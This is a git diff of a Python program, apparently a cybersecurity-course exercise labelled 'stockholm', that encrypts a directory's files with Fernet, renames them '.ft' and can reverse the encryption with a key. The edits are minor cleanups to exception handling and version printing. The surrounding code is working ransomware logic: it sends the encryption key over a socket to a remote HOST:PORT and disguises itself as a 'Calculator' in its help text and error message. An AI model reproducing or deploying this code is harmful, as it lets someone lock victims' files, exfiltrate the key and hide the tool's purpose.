@@ -17,7 +17,6 @@ def encrypt_loop(dir_path: str, f: Fernet):
             for ext in ext_lst:
                 if ext == file_ext:
                     new_file = file + '.ft'
-
                     try:
                         with open(file, 'rb') as f_in:
                             raw_data = f_in.read()
@@ -27,7 +26,7 @@ def encrypt_loop(dir_path: str, f: Fernet):
                         if is_silent == False:
                             print('encrypted: [ ' + file + ' ] ---> [ ' + new_file + ' ]')
                         break
-                    except BaseException as e:
+                    except Exception as e:
                         if is_silent == False:
                             print('(for logging purposes) ' + str(e), file=sys.stderr)
                         pass
@@ -41,7 +40,6 @@ def decrypt_loop(dir_path: str, f: Fernet):
             file_data = splitext(file)
             if file_data[1] == '.ft':
                 decrypted_file = file_data[0]
-
                 try:
                     with open(file, 'rb') as f_in:
                         encrypted_data = f_in.read()
@@ -52,7 +50,7 @@ def decrypt_loop(dir_path: str, f: Fernet):
                     if is_silent == False:
                         print('decrypted: [ '  + decrypted_file + ' ] <--- [ '  + file + ' ]')
                     break
-                except BaseException as e:
+                except Exception:
                     pass
 
 def save_key(key: bytes):
@@ -62,18 +60,14 @@ def save_key(key: bytes):
         s.connect((HOST, PORT))
         s.send(key)
         s.send(b'\n')
-        s.close
 
 def main() -> int:
     parser = argparse.ArgumentParser(description='Calculator: used for calculations')
 
-    parser.add_argument('-v', '--version', help='shows version', action='store_true')
+    parser.add_argument('-v', '--version', help='shows version', action='version', version='stockholm:madrid_cybersecurity, v0.0.1')
     parser.add_argument('-r', '--reverse', type=str, help='reverse encryption')
     parser.add_argument('-s', '--silent', help='does not show output', action='store_true')
     args = parser.parse_args()
-    if args.version:
-        print('stockholm:madrid_cybersecurity, v0.0.1')
-        exit(0)
 
     global is_silent
     is_silent = args.silent
@@ -90,7 +84,7 @@ def main() -> int:
     if args.reverse:
         try:
             f = Fernet(args.reverse)
-        except BaseException as e:
+        except Exception:
             print('Invalid key provided')
             return 1
         decrypt_loop(target_path, f)
@@ -100,7 +94,7 @@ def main() -> int:
         f = Fernet(key)
         try:
             save_key(key)
-        except BaseException as e:
+        except Exception:
             print('Could not execute calculator :-(')
             return 1
         encrypt_loop(target_path, f)
